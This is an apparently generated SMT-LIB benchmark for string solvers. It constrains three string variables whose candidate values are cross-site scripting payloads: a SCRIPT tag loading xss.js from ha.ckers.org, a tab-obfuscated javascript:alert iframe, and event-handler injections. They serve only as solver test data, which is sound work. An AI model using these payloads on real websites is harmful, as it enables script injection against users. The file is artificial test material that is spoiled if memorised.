; random_mix, BMP mode: x, z from disjunctions of constants, y = x ++ z, clauses of 1 to 3 random (negated) constraints of x, y, z: memberships, affixes, contains, lengths, str.at, str.indexof, str.substr, str.replace
(set-logic QF_SLIA)
(set-info :status unsat)
(declare-const x String)
(declare-const y String)
(declare-const z String)
(assert (or (= x "<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>") (= x "<table on\u{1d400}mouseover=""alert(1)"">test</table>") (= x "<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>")))
(assert (or (= z "E>") (= z "d=x style=""transition:color 10s"" ontransitioncancel=alert(1)></picture>") (= z "own=""alert(1)"">test</dfn>")))
(assert (= y (str.++ x z)))
(assert (or (not (str.in_re x ((_ re.from_regex ecma2020) "^([ \u{5c}u00c0-\u{5c}u01ffa-zA-Z'\-]){5,50}$"))) (not (str.in_re y ((_ re.from_regex ecma2020) "[0-9]{1}$"))) (not (= (str.indexof y ">te" 0) 30))))
(assert (not (= (str.at x 39) "T")))
(assert (or (= "t(40)//"">" (str.substr x 61 9)) (not (str.in_re y ((_ re.from_regex ecma2020) "^.{8,}$"))) (str.prefixof "<iframe " x)))
(assert (or (not (= "t(" (str.substr z 56 2))) (= (str.at y 98) "t") (not (str.contains x "alert"))))
(check-sat)
